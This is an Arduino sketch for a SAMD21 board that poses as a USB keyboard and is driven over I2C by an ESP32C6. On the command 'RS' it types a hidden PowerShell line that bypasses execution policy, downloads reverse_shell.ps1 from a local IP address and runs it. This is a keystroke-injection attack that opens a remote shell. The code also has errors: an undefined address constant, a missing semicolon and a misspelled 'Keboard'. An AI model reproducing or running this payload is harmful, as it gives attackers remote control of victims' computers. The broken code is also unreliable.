#include <Wire.h>
#include <Keyboard.h>
#include "lib/Keyboard.h"
// #include "lib/simple-instructions.h"
#include "lib/complex-instructions.h" 

const int I2C_MASTER_ADDR = 0x08; // I2C address of the ESP32C6 (C6 board)
const int ledPin = 13;

void setup()
{
  Wire.begin(I2C_SLAVE_ADDR);   // Initialize I2C as slave
  Wire.onReceive(receiveEvent); // Register the receive event handler
  Serial.begin(115200);         // Initialize Serial for debugging
  Keyboard.begin();             // Initialize the Keyboard library
  //Serial.println("SAMD21 ready to receive commands over I2C");
}

void loop()
{
  // The loop is empty because all the work is done in the receiveEvent function
}

void receiveEvent(int bytes)
{
  String command = "";
  while (Wire.available())
  {
    char c = Wire.read();
    command += c;
  }
  // Serial.println("Received command: " + command);
  executeCommand(command);
}

void executeCommand(String command)
{
  if (command == "RS")
  {
    // Response [To be implemented]: sendResponse("Executing command [RS]");
    // killall(); // Close all windows and stop all processes with a main window
    // openPowerShellAdmin(); // Open Command Prompt as administrator
    openPowerShell(); // Open Command Prompt
    String payload = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://192.168.0.30/reverse_shell.ps1' -OutFile 'C:\\Users\\Public\\reverse_shell.ps1'; Start-Job -FilePath 'C:\\Users\\Public\\reverse_shell.ps1'\"";
    Keyboard.println(payload); 
    // End the Keyboard
    // Response [To be implemented]: sendResponse("Command [RS] executed successfully");
  }
  else if (command == "ent")
  {
    openPowerShell(); // Open Command Prompt
    String payload = ""
    Keboard.println(payload); 
  }
  // Add more commands as needed
}

// Response [To be implemented]: void sendResponse(String response)
// Response [To be implemented]: {
// Response [To be implemented]:   Wire.beginTransmission(I2C_MASTER_ADDR);
// Response [To be implemented]:   Wire.write(response.c_str(), response.length());
// Response [To be implemented]:   Wire.endTransmission();
// Response [To be implemented]:   Serial.println("Sent response to ESP32C6: " + response);
// Response [To be implemented]: }